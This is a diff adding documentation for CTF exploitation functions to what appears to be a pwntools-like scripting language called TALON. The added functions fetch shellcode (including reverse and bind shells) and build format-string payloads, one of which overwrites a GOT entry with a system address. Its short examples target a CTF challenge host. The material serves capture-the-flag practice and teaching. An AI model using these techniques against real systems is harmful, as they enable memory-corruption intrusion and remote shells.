@@ -305,6 +305,71 @@ let offset = cyclic_find("daab")
 print("Offset:", offset)
 ```
 
+## CTF Exploitation Functions
+
+### `shellcode(arch, type)`
+Retrieves pre-built shellcode from the integrated shellcode database.
+
+Returns: Map with `bytes` (shellcode bytes), `size` (length in bytes), `description` (shellcode purpose)
+
+Supported architectures: `x86`, `x64`, `arm`, `arm64`, `mips`
+Supported types: `execve`, `shell`, `setuid`, `read_flag`, `reverse_shell`, `bind_shell`
+
+```talon
+let sc = shellcode("x64", "execve")
+print("[*] Shellcode:", sc["description"])
+print("[*] Size:", sc["size"], "bytes")
+send(conn, sc["bytes"])
+
+let arm_shell = shellcode("arm", "shell")
+let payload = padding + arm_shell["bytes"]
+```
+
+### `fmtstr_write(offset, writes)`
+Generates a format string payload for arbitrary memory writes.
+
+Parameters:
+- `offset` - Format string offset (position on stack)
+- `writes` - Map of {address: value} pairs to write
+
+Returns: String containing the format string payload
+
+```talon
+let offset = 6
+let got_exit = 0x0804a020
+let system_addr = 0xf7e50da0
+
+let payload = fmtstr_write(offset, {got_exit: system_addr})
+send(conn, payload)
+
+let multiple_writes = fmtstr_write(8, {
+    0x0804a020: 0xdeadbeef,
+    0x0804a024: 0xcafebabe
+})
+```
+
+### `find_fmt_offset(conn, marker)` (stdlib function)
+Automatically discovers the format string offset by sending test patterns.
+
+**Note**: This is a stdlib helper function. Include `stdlib/ctf_helpers.talon` to use it.
+
+Parameters:
+- `conn` - Active connection handle
+- `marker` - Test marker value (e.g., 0x41414141)
+
+Returns: Integer offset where format string reads from stack
+
+```talon
+include "stdlib/ctf_helpers.talon"
+
+let conn = connect("pwn.chal.ctf", 9999)
+let offset = find_fmt_offset(conn, 0x41414141)
+print("[+] Format offset:", offset)
+
+let leak_payload = "%{}$p".format(offset + 2)
+send(conn, leak_payload)
+```
+
 ## Network I/O
 
 ### `connect(host, port)`
@@ -372,6 +437,7 @@ interactive(conn)
 | Libc Database | `Libc()` |
 | ROP Gadgets | `ROP()`, `find()`, `quick_rop()` |
 | Exploit Patterns | `cyclic()`, `cyclic_find()` |
+| CTF Exploitation | `shellcode()`, `fmtstr_write()`, `find_fmt_offset()` (stdlib) |
 | Network I/O | `connect()`, `send()`, `recv()`, `recvuntil()`, `interactive()` |
 
 Note: TALON includes many more built-ins across exploitation, analysis, fuzzing, and tooling. See the main README "Built-in Functions" section for the full category listing.
